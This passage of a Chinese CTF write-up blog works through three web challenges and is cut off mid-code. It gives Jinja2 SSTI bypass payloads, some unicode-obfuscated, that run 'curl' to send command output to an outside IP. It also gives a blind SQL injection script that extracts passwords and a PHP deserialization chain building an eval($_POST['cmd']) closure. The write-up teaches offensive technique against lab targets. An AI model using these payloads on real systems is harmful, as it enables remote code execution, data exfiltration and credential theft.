class="string">&quot;__getitem__&quot;</span>)(xx)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">132</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>进行爆破，得到132</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801104937777.png" alt="image-20220801104937777"></p><p>因为不能回显，所以使用外带命令实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(xx)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;curl 116.62.240.148:7011 -d &quot;</span>`ls /`<span class="string">&quot;&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)())%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">132</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u006c\u0020\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0037\u0030\u0031\u0031&quot;</span>)|attr(<span class="string">&quot;\u0072\u0065\u0061\u0064&quot;</span>)())%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>不知道是不是题目环境问题，curl有时候行，有时候不行，有时候销毁靶机之后就会像下面这样忽然出现一大堆的请求（真神奇）</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801132613514.png" alt="image-20220801132613514"></p><p>而后销毁又申请环境好多次，尝试无果。。。</p><h2 id="绝对防御"><a href="#绝对防御" class="headerlink" title="绝对防御"></a>绝对防御</h2><p>JSFinder：查找隐藏在js文件中的api 接口和敏感目录，以及一些子域名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http://badcc3c9-4df2-4c54-a430-bc7c8b122353.node4.buuoj.cn:<span class="number">81</span>/</span><br></pre></td></tr></table></figure><p>扫描结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801234847743.png" alt="image-20220801234847743"></p><p>访问SUPPERAPI.php，查看源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&#x27;[\]]/im</span>;</span><br><span class="line">        <span class="keyword">if</span> (reg.<span class="title function_">test</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&quot;id&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;提示：您输入的信息含有非法字符！&quot;</span>);</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;/&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">check</span>()</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>window.location.search.substring(1)</code>功能为获取当前页面GET方式请求<code>?后的指定参数</code></p><p>这段代码的意思大概为传递调用getQueryVariable，参数为id，该函数中获取<code>?后的请求参数</code>，用<code>&amp;</code>分割，用<code>=</code>分割，取前者，也就是变量名，并将该变量名和<code>id</code>进行对比，成功则返回<code>pair[1]</code></p><p>所以要传递变量id，但是接下来怎么利用不清楚，根据官方wp，这里用id进行sql盲注（防护不用管，是前端的防护，直接写脚本就可以）</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220802001640636.png" alt="image-20220802001640636"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://badcc3c9-4df2-4c54-a430-bc7c8b122353.node4.buuoj.cn:81/SUPPERAPI.php?&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;j=&quot;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)     <span class="comment"># # 爆库名  ctf</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)   <span class="comment"># 爆表名 users</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)  <span class="comment">#爆字段名 id,username,password,ip,time,USER</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select password from users where id=2),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)  <span class="comment"># 爆password</span></span><br><span class="line">        <span class="comment"># payload = &quot;id=1 and ascii(substr(database(),%d,1))=%s&quot; %(j,str(i))  # 爆库名</span></span><br><span class="line">        <span class="comment"># payload = &quot;id=1 and 2&gt;1&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">        response = requests.get(url+payload)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;instance = <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_password = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_username = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; User bWlubmllLndlaW1hbm4= has created.</span><br></pre></td></tr></table></figure><p>对cookie进行base64解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220806191259786.png" alt="image-20220806191259786"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;*_username&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;ZGVyZWswNQ==&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;*_password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;03a83270035a975b5150954956db1a46&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Useremail&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;levi87@barton.com&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Userinstance&quot;</span>;r:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>cookie是User类对象的序列化</p><p>而页面回显的<code>User ZGVyZWswNQ== has created.</code>表示<code>__destruct</code>方法被调用，找反序列化利用链</p><h3 id="composer-json泄露"><a href="#composer-json泄露" class="headerlink" title="composer.json泄露"></a>composer.json泄露</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;fakerphp/faker&quot;</span>: <span class="string">&quot;^1.19&quot;</span>,</span><br><span class="line">    <span class="string">&quot;opis/closure&quot;</span>: <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对于fakerphp这个依赖，他的Generator类，是主要的类，生成不存在的属性时都通过format方法，这个方法中存在call_user_func_array 的调用</p></blockquote><p>关键的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">trigger_deprecation</span>(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>注意Faker\Generator类中有一个<code>__wakeup</code>方法，会将<code>formatters</code>的值替换为空，所以无论我们刚开始对formatters赋值的是什么，都会在<code>__wakeup</code>这里将其替换为空数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>官方wp中，这里用的是<code>php引用</code>来绕过，比较关键的是<code>该引用语句执行在 Generator类的__wakeup 后</code></p><p>因为不是很理解，所以本地调试一下，设置了formatters的两种情况</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001238313.png" alt="image-20220807001238313"></p><h3 id="php引用"><a href="#php引用" class="headerlink" title="php引用"></a>php引用</h3><p>当其为地址时，在<code>Faker\Generator</code>的wakeup执行前，这个formatters为null，wakeup执行后，其变为空数组</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001458924.png" alt="image-20220807001458924"></p><p>而在User类的wakeup执行后，这个formatters变为了<code>[&quot;_username&quot;=&gt;&quot;phpinfo&quot;]</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001702781.png" alt="image-20220807001702781"></p><p>这是一个很有趣的现象，这就导致了wakeup方法的防护是无用的，可以通过php引用对对象任意赋值</p><h3 id="非php引用情况下"><a href="#非php引用情况下" class="headerlink" title="非php引用情况下"></a>非php引用情况下</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;formatters = &amp;$obj-&gt;password;</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;formatters = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然<code>Faker\Generator</code>类对象在wakeup函数执行前，formatters为<code>[&quot;_username&quot;=&gt;&quot;phpinfo&quot;]</code>，但是在wakeup函数执行后，还是被修改为了空数组</p><p>并且因为没有使用php引用，所以formatters始终为空数组</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807002107803.png" alt="image-20220807002107803"></p><h3 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h3><p>这里分析一下调用phpinfo()的原理，<code>__get</code>方法中参数为<code>__username</code>，然后一路传参，在最后<code>call_user_func_array($this-&gt;getFormatter($format), $arguments);</code>那里，第一个参数就是<code>phpinfo</code>，而第二个参数为空，所以就是调用phpinfo</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807002958404.png" alt="image-20220807002958404"></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807003144032.png" alt="image-20220807003144032"></p><p>调用非phpinfo函数</p><blockquote><p>因为我们是通过__get 传入的，传入函数的参数不可控，phpinfo不需要参数，所以调用了。如果想要只控制函数，造成任意代码执行，可以使用反序列化闭包，这在之前也是有考过的。直接包含closure依赖中的autoload.php</p></blockquote><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807004720019.png" alt="image-20220807004720019"></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807005604354.png" alt="image-20220807005604354"></p><p>整个过程中调试的代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="comment">// $this-&gt;_password = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">            <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;vendor\opis\closure\autoload.php&#x27;</span>;     <span class="comment">//相对路径</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$b</span>=Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);   <span class="comment">//调用该serialize()</span></span><br><span class="line">            <span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>); </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="variable">$c</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="title function_ invoke__">str_replace</span>(<span 